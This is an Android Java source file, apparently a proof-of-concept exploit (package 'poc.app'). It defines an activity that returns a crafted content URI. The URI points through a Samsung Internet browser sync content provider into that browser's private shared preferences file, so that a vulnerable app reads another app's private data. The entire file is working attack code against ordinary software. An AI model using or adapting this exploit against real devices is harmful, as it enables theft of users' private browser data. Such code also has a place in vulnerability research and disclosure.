package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class InterceptActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://com.sec.android.app.sbrowser.scloud.quickaccess.sync2/data/user/0/com.sec.android.app.sbrowser/shared_prefs/com.sec.android.app.sbrowser_preferences.xml");
        setResult(-1, new Intent().setData(uri));
        finish();
    }
}
